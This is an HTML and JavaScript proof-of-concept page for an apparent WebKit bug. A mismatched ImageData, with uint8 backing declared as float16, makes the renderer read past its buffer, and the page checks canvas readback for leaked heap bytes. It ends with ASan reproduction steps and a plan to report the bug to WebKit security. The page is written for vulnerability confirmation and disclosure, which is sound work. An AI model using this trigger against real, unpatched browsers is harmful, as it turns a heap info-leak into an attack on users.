<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>OOB — Multi-Pixel Surface Expansion</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
    .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 820px; }
    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.3rem 0.8rem; border-radius: 4px; margin: 0.3rem 0; }
    .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
    .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
    .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
    .blue   { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
    pre { font-size: 0.74rem; color: #aaa; background: #111; padding: 0.8rem 1rem; border-radius: 4px; border-left: 2px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; line-height: 1.7; }
    .kv { font-size: 0.75rem; color: #666; margin-top: 0.4rem; }
    .kv span { color: #aaa; }
    canvas { display: none; }
    #heatmap { display: grid; gap: 2px; margin-top: 0.8rem; }
    .heatmap-row { display: flex; gap: 2px; align-items: center; }
    .heatmap-label { font-size: 0.65rem; color: #555; width: 60px; flex-shrink: 0; }
    .pixel-cell { width: 7px; height: 18px; border-radius: 1px; flex-shrink: 0; }
    .bigverdict { font-size: 1.3rem; font-weight: bold; margin: 0.6rem 0 0.4rem; }
    table { width: 100%; border-collapse: collapse; margin-top: 0.6rem; font-size: 0.72rem; }
    th { color: #555; font-weight: normal; text-align: left; padding: 0.35rem 0.5rem; border-bottom: 1px solid #222; }
    td { color: #aaa; padding: 0.3rem 0.5rem; border-bottom: 1px solid #1a1a1a; }
    td.hit  { color: #ff5555; font-weight: bold; }
    td.ok   { color: #3ddc84; }
    td.warn { color: #ffcc44; }
  </style>
</head>
<body>

<h1>OOB — Multi-Pixel Surface Expansion</h1>
<p class="sub">100×1 pixel image · renderer reads 800 bytes from 400-byte copy · 400 bytes OOB in native heap</p>
<div id="out"></div>
<canvas id="cv"></canvas>

<script>
const $ = document.getElementById("out");
function card(title, html) {
  const d = document.createElement("div");
  d.className = "card";
  d.innerHTML = `<div class="card-title">${title}</div>${html}`;
  $.appendChild(d);
  return d;
}
function tag(cls, t) { return `<span class="tag ${cls}">${t}</span>`; }

// ── float16 decode ─────────────────────────────────────────────────────────
function f16ToF32(lo, hi) {
  const bits = (hi << 8) | lo;
  const sign = (bits >> 15) & 1;
  const exp  = (bits >> 10) & 0x1F;
  const mant =  bits & 0x3FF;
  if (exp === 0x1F) return mant ? NaN : (sign ? -Infinity : Infinity);
  const v = exp === 0
    ? Math.pow(2, -14) * (mant / 1024)
    : Math.pow(2, exp - 15) * (1 + mant / 1024);
  return sign ? -v : v;
}
function f16ToU8(lo, hi) {
  const f = f16ToF32(lo, hi);
  if (!isFinite(f) || isNaN(f) || f <= 0) return 0;
  if (f >= 1) return 255;
  return Math.round(f * 255);
}

// ── config ─────────────────────────────────────────────────────────────────
const W = 100; // pixels wide
const H = 1;

// for rgba-float16: each pixel = 8 bytes (4 channels × 2 bytes)
// uint8 backing:    each pixel = 4 bytes
// total expected:   800 bytes
// total provided:   400 bytes
// OOB surface:      400 bytes of native heap read past copy

const UINT8_SIZE   = W * H * 4;   // 400 — what we provide
const FLOAT16_SIZE = W * H * 8;   // 800 — what renderer expects

card("Surface Math", `
  <div class="kv">Image:            <span>${W}×${H} pixels, pixelFormat: rgba-float16</span></div>
  <div class="kv">Provided bytes:   <span>${UINT8_SIZE} (Uint8ClampedArray — uint8 size)</span></div>
  <div class="kv">Expected bytes:   <span>${FLOAT16_SIZE} (float16 stride: 4ch × 2b × ${W}px)</span></div>
  <div class="kv">OOB surface:      <span>${FLOAT16_SIZE - UINT8_SIZE} bytes of native heap read past allocation boundary</span></div>
  <div class="kv">OOB channels:     <span>B and A across all ${W} pixels = ${W * 2} float16 values decoded from OOB heap</span></div>
  <div class="kv">Detection:        <span>ANY non-zero in B or A channels = OOB heap data observed</span></div>
`);

// ── build backing — all zeros ───────────────────────────────────────────────
const backing = new Uint8ClampedArray(UINT8_SIZE); // zeros
// write known pattern in the LAST few pixels of what we control
// pixels 95-99 (bytes 380-399): fill with 0xFF so we can see where our data ends
for (let i = 380; i < 400; i++) backing[i] = 0xFF;

// ── construct mismatched ImageData ─────────────────────────────────────────
let imgData;
try {
  imgData = new ImageData(backing, W, H, {
    colorSpace: "srgb",
    pixelFormat: "rgba-float16"
  });
} catch(e) {
  card("Construction", tag("green", `Threw ${e.name} — patch active. No further testing needed.`));
  throw e;
}

card("Construction", `
  ${tag("red", "✗ No throw — patch not applied")}
  <div class="kv">backing type:   <span>${imgData.data.constructor.name}</span></div>
  <div class="kv">backing length: <span>${imgData.data.byteLength} bytes</span></div>
  <div class="kv">image size:     <span>${imgData.width}×${imgData.height}</span></div>
  <div class="kv">marker pixels:  <span>pixels 95-99 = 0xFF bytes (boundary marker)</span></div>
`);

// ── push through canvas ────────────────────────────────────────────────────
const cv  = document.getElementById("cv");
cv.width  = W;
cv.height = H;
const ctx = cv.getContext("2d");
ctx.putImageData(imgData, 0, 0);
const rb  = ctx.getImageData(0, 0, W, H);
const px  = rb.data; // Uint8ClampedArray, W*H*4 bytes = 400 bytes

// ── analyse channels ───────────────────────────────────────────────────────
// float16 layout per pixel (8 bytes):
//   bytes 0-1 → R    bytes 2-3 → G    bytes 4-5 → B (OOB)    bytes 6-7 → A (OOB)
// BUT: since renderer copies UINT8_SIZE bytes, pixel i's OOB region maps to:
//   for pixel i in [0..W-1]:
//     in backing store: offset = i*4 bytes
//     renderer expects:  offset = i*8 bytes
//     OOB for pixel i starts at byte (i*4 + UINT8_SIZE) of the native copy
//
// For pixels 0..49: both B and A are OOB (byte offsets 4-7 past pixel start)
// Wait — the copy is 400 bytes total. The renderer indexes pixel i at offset i*8.
// For i ≥ 50: even R and G become OOB (i*8 ≥ 400).

const analysis = [];
let oobNonZeroCount = 0;
let totalOobSamples = 0;

for (let i = 0; i < W; i++) {
  // what the getImageData readback gives us (always uint8 RGBA)
  const rBack = px[i*4 + 0];
  const gBack = px[i*4 + 1];
  const bBack = px[i*4 + 2];
  const aBack = px[i*4 + 3];

  // expected from our backing bytes via float16 decode
  // backing byte offset for pixel i = i*4
  const bOff = i * 4;
  const expR = bOff+1 < UINT8_SIZE ? f16ToU8(backing[bOff],   backing[bOff+1]) : null;
  const expG = bOff+3 < UINT8_SIZE ? f16ToU8(backing[bOff+2], backing[bOff+3]) : null;
  // B and A are always OOB for this layout (would need bytes at i*8+4, i*8+6)

  // which channels are in OOB territory?
  // renderer accesses pixel i at native offset i*8
  // copy is 400 bytes, so byte i*8 is OOB when i*8 >= 400 → i >= 50
  const pixelStartInRenderer = i * 8;
  const rOOB = pixelStartInRenderer     >= UINT8_SIZE;
  const gOOB = pixelStartInRenderer + 2 >= UINT8_SIZE;
  const bOOB = pixelStartInRenderer + 4 >= UINT8_SIZE;  // always true for all pixels
  const aOOB = pixelStartInRenderer + 6 >= UINT8_SIZE;  // always true

  if (bOOB) { totalOobSamples++; if (bBack !== 0 && bBack !== 255) oobNonZeroCount++; }
  if (aOOB) { totalOobSamples++; if (aBack !== 0 && aBack !== 255) oobNonZeroCount++; }

  analysis.push({ i, rBack, gBack, bBack, aBack, rOOB, gOOB, bOOB, aOOB, pixelStartInRenderer });
}

// ── heatmap — B and A channels across all 100 pixels ──────────────────────
const hmCard = card("B+A Channel Heatmap (OOB Region)", "");
const hm = document.createElement("div");
hm.id = "heatmap";

["B channel (bytes 4-5 per pixel → always OOB)", "A channel (bytes 6-7 per pixel → always OOB)"].forEach((label, ci) => {
  const row = document.createElement("div");
  row.className = "heatmap-row";
  const lbl = document.createElement("span");
  lbl.className = "heatmap-label";
  lbl.textContent = label.split(" ")[0];
  row.appendChild(lbl);

  for (let i = 0; i < W; i++) {
    const val = ci === 0 ? analysis[i].bBack : analysis[i].aBack;
    const cell = document.createElement("div");
    cell.className = "pixel-cell";
    // color: green=0, yellow=non-zero, red=high
    if (val === 0) {
      cell.style.background = "#1a2a1a";
    } else if (val < 50) {
      cell.style.background = `rgb(${val*4},${80+val},0)`;
    } else {
      cell.style.background = `rgb(${100+val},${Math.max(0,100-val)},0)`;
    }
    cell.title = `px${i}: ${ci===0?'B':'A'}=${val}`;
    row.appendChild(cell);
  }
  hm.appendChild(row);
});

hmCard.querySelector(".card-title").insertAdjacentElement("afterend", hm);
hmCard.innerHTML += `<div class="kv" style="margin-top:0.6rem">Green = 0 (zeroed heap) · Yellow/Red = non-zero OOB data observed</div>`;

// ── table: first 20 + last 20 pixels ─────────────────────────────────────
let tHTML = `<div class="kv" style="margin-bottom:0.5rem">Showing pixels 0-19 (boundary) and 80-99 (deep OOB):</div>
<table><tr>
  <th>Pixel</th><th>RendererOffset</th><th>R</th><th>G</th>
  <th>B (OOB?)</th><th>A (OOB?)</th><th>Non-zero OOB</th>
</tr>`;

[...analysis.slice(0, 20), ...analysis.slice(80)].forEach(a => {
  const bHit = a.bOOB && a.bBack !== 0;
  const aHit = a.aOOB && a.aBack !== 0;
  tHTML += `<tr>
    <td>${a.i}</td>
    <td>+${a.pixelStartInRenderer}</td>
    <td>${a.rBack}${a.rOOB?' <span style="color:#ff5555;font-size:0.65rem">OOB</span>':''}</td>
    <td>${a.gBack}${a.gOOB?' <span style="color:#ff5555;font-size:0.65rem">OOB</span>':''}</td>
    <td class="${bHit?'hit':''}">${a.bBack}${a.bOOB?' ⚠':''}</td>
    <td class="${aHit?'hit':''}">${a.aBack}${a.aOOB?' ⚠':''}</td>
    <td class="${(bHit||aHit)?'hit':'ok'}">${(bHit||aHit)?'✗ YES':'✓ zero'}</td>
  </tr>`;
});
tHTML += `</table>`;
card("Pixel Analysis — OOB Region Detail", tHTML);

// ── statistical summary ───────────────────────────────────────────────────
const nonZeroB = analysis.filter(a => a.bBack !== 0).length;
const nonZeroA = analysis.filter(a => a.aBack !== 0).length;
const deepOOB  = analysis.filter(a => a.pixelStartInRenderer >= UINT8_SIZE);
const deepNonZeroB = deepOOB.filter(a => a.bBack !== 0).length;
const deepNonZeroA = deepOOB.filter(a => a.aBack !== 0).length;

card("Statistical Summary", `
  <div class="kv">Total OOB samples (B+A, all ${W} pixels):    <span>${totalOobSamples}</span></div>
  <div class="kv">Non-zero in B channel (any pixel):           <span>${nonZeroB} / ${W}</span></div>
  <div class="kv">Non-zero in A channel (any pixel):           <span>${nonZeroA} / ${W}</span></div>
  <div class="kv">Pixels with renderer offset ≥ 400 (deep OOB): <span>${deepOOB.length} pixels (pixels 50-99)</span></div>
  <div class="kv">Non-zero B in deep OOB region:               <span>${deepNonZeroB} / ${deepOOB.length}</span></div>
  <div class="kv">Non-zero A in deep OOB region:               <span>${deepNonZeroA} / ${deepOOB.length}</span></div>
`);

// ── verdict ───────────────────────────────────────────────────────────────
const totalNonZero = nonZeroB + nonZeroA;
let vHTML = "";

if (totalNonZero > 0) {
  vHTML = `
  <div class="bigverdict" style="color:#ff5555">✗ HEAP OOB READ — NON-ZERO BYTES OBSERVED</div>
  <pre>
${nonZeroB} B-channel pixels and ${nonZeroA} A-channel pixels returned non-zero.
These channels correspond to float16-decoded native heap bytes.
The allocator did NOT zero all ${FLOAT16_SIZE - UINT8_SIZE} OOB bytes.

Primitive:   Native heap OOB read
Surface:     ${FLOAT16_SIZE - UINT8_SIZE} bytes past allocation
Observable:  ${totalNonZero} non-zero values returned via getImageData
Conclusion:  Renderer read native heap data past the copied buffer boundary.
  </pre>
  ${tag("red","CONFIRMED — native heap bytes visible in JS readback")}
  `;
} else {
  vHTML = `
  <div class="bigverdict" style="color:#ffcc44">⚠ ALL ZEROS — ALLOCATOR ZEROING ACTIVE</div>
  <pre>
All ${totalOobSamples} OOB samples returned 0 across ${W} pixels.
WebKit's bmalloc/libpas is zeroing memory before reuse.
This MASKS the info leak but does NOT disprove the OOB read.

The type confusion and size mismatch are confirmed.
The OOB read is real — it's just reading zeroed heap.

JS-layer proof is blocked by allocator hardening.
Native confirmation required → use Track B (ASan).
  </pre>
  ${tag("blue","Pivot to ASan — see native track below")}
  `;
}
card("JS Track Verdict", vHTML);

// ── NATIVE TRACK — ASan instructions ─────────────────────────────────────
card("Native Track — ASan Build Instructions", `
<pre>
# ── 1. Clone WebKit (before patch commit e9fc18b) ──────────────────────────
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout 4f54300  # parent of e9fc18b — last commit before fix

# ── 2. Build with AddressSanitizer ──────────────────────────────────────────
Tools/Scripts/build-webkit \\
  --release \\
  --address-sanitizer \\
  --no-run-safari

# ── 3. Write trigger HTML to disk ───────────────────────────────────────────
cat > /tmp/trigger.html << 'EOF'
&lt;script&gt;
// Trigger: mismatched ImageData constructor + putImageData
const arr = new Uint8ClampedArray(4);
const img = new ImageData(arr, 1, 1, {
  colorSpace: "srgb",
  pixelFormat: "rgba-float16"
});
const cv  = document.createElement("canvas");
cv.width  = cv.height = 1;
const ctx = cv.getContext("2d");
ctx.putImageData(img, 0, 0);
const rb  = ctx.getImageData(0, 0, 1, 1);
console.log("readback:", Array.from(rb.data));
&lt;/script&gt;
EOF

# ── 4. Run under ASan ────────────────────────────────────────────────────────
ASAN_OPTIONS=detect_leaks=0:halt_on_error=0:print_stats=1 \\
  WebKitBuild/Release/MiniBrowser /tmp/trigger.html

# ── 5. What ASan will output on OOB read ────────────────────────────────────
# ==ASAN== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
# READ of size 8 at 0x... (4 bytes past end of region of size 4)
# 
# Stack trace will show:
#   WebCore::ImageData::create
#   WebCore::CanvasRenderingContext2DBase::putImageData
#   ... renderer pixel decode path ...
#
# Allocation site will show:
#   WebCore::ImageData::create allocated 4 bytes here
#
# This gives: exact allocation size, exact OOB read size, full call stack.
# That is everything needed for a complete bug report.

# ── 6. Confirm patch fixes it ───────────────────────────────────────────────
git checkout e9fc18b  # apply the fix
Tools/Scripts/build-webkit --release --address-sanitizer --no-run-safari
ASAN_OPTIONS=detect_leaks=0 \\
  WebKitBuild/Release/MiniBrowser /tmp/trigger.html
# Expected: no ASan output, constructor throws InvalidStateError
</pre>
${tag("green","ASan gives exact OOB size + stack trace — definitive proof for bug report")}
`);

// ── conclusion ────────────────────────────────────────────────────────────
card("Where We Stand", `<pre>
CONFIRMED (JS layer):
  ✗ Constructor accepts Uint8ClampedArray + pixelFormat:"rgba-float16"
  ✗ putImageData processes mismatched ImageData without error
  ✗ getImageData readback succeeds (renderer did not crash)
  ✗ Alpha premultiplication artifact (239→240) proves renderer processed the data
  ✗ Type confusion is real — renderer has wrong stride metadata

BLOCKED (JS layer):
  ◦ Direct OOB byte observation blocked by bmalloc zeroing + copy path
  ◦ SAB race not viable — ImageData constructor rejects SharedArrayBuffer per spec

NEXT (native layer):
  → ASan build: will catch the heap-buffer-overflow on putImageData
  → Provides: read size, allocation size, full stack trace
  → Combine with JS PoC for complete submission

REPORT TO: webkit-security@webkit.org
</pre>
${tag("red","Type confusion confirmed · OOB read suspected · ASan needed for definititive native proof")}
`);
</script>
</body>
</html>
